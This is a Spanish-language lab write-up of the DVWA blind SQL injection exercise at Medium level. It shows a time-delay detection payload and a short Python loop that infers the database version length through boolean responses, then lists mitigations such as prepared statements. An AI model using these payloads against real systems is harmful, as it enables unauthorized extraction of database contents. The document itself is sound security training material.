# Ejercicio 11: SQL Injection (Blind) - (Nivel: Medium)

Este módulo aborda la explotación de una vulnerabilidad de inyección SQL de tipo "ciega" (Blind), donde la aplicación no devuelve datos directamente de la base de datos en la pantalla, sino que solo confirma si la consulta fue exitosa o no.

## 📑 Descripción del Escenario

En el nivel Medium, la aplicación utiliza peticiones POST y aplica ciertos filtros para evitar el uso de comillas. A diferencia de la inyección SQL convencional, aquí no vemos los resultados de la base de datos (como nombres o contraseñas) reflejados en el HTML. El servidor solo responde con mensajes booleanos como: "User ID exists in the database" o "User ID is missing from the database".

## 🛠️ Herramientas Utilizadas

- DVWA (Desplegado en Docker).
- Python: Para automatizar el proceso de fuerza bruta carácter por carácter.
- Librería Requests: Para gestionar las peticiones HTTP y las cookies de sesión.

## 🚀 Ejecución del Ataque

Debido a que extraer información manualmente mediante respuestas booleanas sería extremadamente lento, se utiliza un script de Python para automatizar el descubrimiento de la versión de la base de datos.

### 1. Detección de la Vulnerabilidad

Se puede confirmar la vulnerabilidad utilizando una función de retardo de tiempo. El siguiente payload hace que el servidor tarde 5 segundos en responder si es vulnerable:

```sql
1 and sleep(5)
```

### 2. Automatización con Python

El script realiza dos tareas principales:

- Determinar la longitud: Itera probando la longitud de la cadena de la versión hasta recibir la confirmación de éxito.
- Extracción de caracteres: Utiliza funciones como ascii() y substring() para adivinar cada carácter de la versión basándose en su valor ASCII.

```python
# Ejemplo de lógica para obtener la longitud en nivel Medium
for i in range(100):
    parameters = f"id=1+and+length(version())={i}&Submit=Submit"
    r = requests.post(url, headers=headers, data=parameters)
    if 'User ID exists in the database' in r.text:
        print(f'length = {i}')
        break
```

## 📸 Evidencia de Explotación

Como se observa en la captura:

- El script sqlInjection.py se ejecutó con éxito en el entorno local.

  ![Captura del Resultado](../images/commmand_injection2.png)

Resultado obtenido: Se identificó que la longitud de la cadena es 24 y la versión exacta de la base de datos es 10.1.26-MariaDB-0+deb9u1.

Se muestra la terminal de Kali Linux integrada con las herramientas de almacenamiento del navegador para validar la sesión activa.

## ✅ Conclusión y Mitigación

La inyección ciega demuestra que no mostrar errores de base de datos no es una medida de seguridad suficiente, ya que la información puede extraerse mediante inferencia lógica. Para mitigar este riesgo se debe:

- Implementar Consultas Preparadas (Prepared Statements): Es la única forma definitiva de evitar que los datos de entrada alteren la lógica de la consulta SQL.
- Deshabilitar funciones peligrosas: Restringir el uso de funciones como sleep() o el acceso a metadatos de la versión para usuarios web.
- Manejo genérico de errores: Asegurar que los mensajes de éxito o error no den pistas sobre la estructura interna de la base de datos.

Recuerda: Este ejercicio se ha realizado en un entorno controlado con fines exclusivamente educativos.